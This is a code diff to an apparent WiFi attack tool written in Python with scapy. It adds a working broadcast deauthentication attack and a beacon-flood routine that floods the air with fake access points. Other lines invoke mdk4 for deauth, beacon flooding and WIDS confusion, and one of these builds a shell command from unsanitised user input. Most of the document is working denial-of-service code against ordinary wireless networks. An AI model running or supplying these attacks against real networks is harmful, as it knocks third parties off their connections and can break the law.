@@ -7,6 +7,7 @@ import threading
 import subprocess
 from scapy.all import *
 from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff
+from scapy.layers.dot11 import *
 _this_dir = os.path.dirname(os.path.abspath(__file__))
 _parent_dir = os.path.dirname(_this_dir)
 for _p in [_parent_dir, _this_dir]:
@@ -24,7 +25,68 @@ class WiFiAttackModule:
         self.monitor_mode_enabled = False
         self.original_interface = None
         self.interface = None
-        
+    def deauth_all(self, access_point, interface):
+        packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", 
+                        addr2=access_point,
+                        addr3=access_point)/ Dot11Deauth(reason=7)
+        debug("info", "Starting deauth attack... Press Ctrl+C to stop.")
+        while True:
+            try:
+                sendp(packet, inter=0.01, count=5, 
+                    iface=interface, verbose=0)
+            except KeyboardInterrupt:
+                debug("info", "Deauth attack interrupted by user")
+                break
+            except Exception as e:
+                debug("critical", f"Deauth packet send failed: {e}")
+                time.sleep(0.1)
+                break
+    
+    def access_point_flood(self, interface, count=200):
+        """Continuously broadcast fake access points with noisy garbage SSIDs."""
+        noise_chars = string.punctuation
+        supported_rates = b'\x82\x84\x8b\x96'  # 1,2,5.5,11 Mbps
+        debug("info", f"Starting AP flood on {interface} with APs...")
+        debug("info", "AP Flood Running... Press Ctrl+C to stop.")
+        self.stop_sniff = False
+
+        while not self.stop_sniff:
+            packet_batch = []
+            for i in range(count):
+                if self.stop_sniff:
+                    break
+                ssid = ''.join(random.choice(noise_chars) for _ in range(random.randint(12, 24)))
+                mac = ':'.join('%02x' % random.randint(0, 255) for _ in range(6))
+                channel = random.randint(1, 11)
+                packet = (
+                    RadioTap() /
+                    Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac) /
+                    Dot11Beacon(cap=0x0411) /
+                    Dot11Elt(ID="SSID", info=ssid.encode('utf-8')) /
+                    Dot11Elt(ID="Rates", info=supported_rates) /
+                    Dot11Elt(ID="DSset", info=bytes([channel]))
+                )
+                packet_batch.append(packet)
+
+            if self.stop_sniff:
+                break
+
+            try:
+                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
+                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
+                sendp(packet_batch, inter=0.0002, iface=interface, verbose=0)
+            except KeyboardInterrupt:
+                debug("info", "AP flood interrupted by user")
+                return
+
+            if self.stop_sniff:
+                break
+
+            time.sleep(0.0005)
+
+        debug("info", "AP flood stopped.")
+    
+
     def cleanup_monitor_mode(self):
         if not self.monitor_mode_enabled:
             return
@@ -214,8 +276,6 @@ class WiFiAttackModule:
         for t in self.scan_threads:
             t.join(timeout=3)
         
-
-
     def wifi_attack_menu(self, chosen_bssid, ssid):
         self.restore_default_signal()
         while True:
@@ -245,7 +305,7 @@ class WiFiAttackModule:
                 debug("info", "Starting...")
                 os.system(f"mdk4 {self.interface} f -s abcp -m n -p 24500 -c {channel}")
             elif atkmode == "4" or atkmode.lower() == "deauth denial of service":
-                os.system(f"mdk4 {self.interface} d -s 51500 -B {chosen_bssid}")
+                self.deauth_all(chosen_bssid, self.interface)
     def run(self):
         try:
             signal.signal(signal.SIGINT, self.signal_handler)
@@ -274,14 +334,7 @@ class WiFiAttackModule:
                 if others == "0":
                     return
                 elif others == "1" or others.lower() == "network flood":
-                    os.system(f"mdk4 {self.interface} b -a -w n -m -s 1000000")
-                elif others == "2" or others.lower() == "wids confusion":
-                    ssid = input("Target SSID: ").strip()
-                    channel = input("Channel: ").strip()
-                    if channel:
-                        os.system(f'mdk4 {self.interface} w -z -s 10000 -c {channel} -e "{ssid}"')
-                    else:
-                        debug("error", "Channel is required for WIDS Confusion")
+                    self.access_point_flood(self.interface)
                 return
 
             # Normal mode with scan, youll enjoy these cause yes
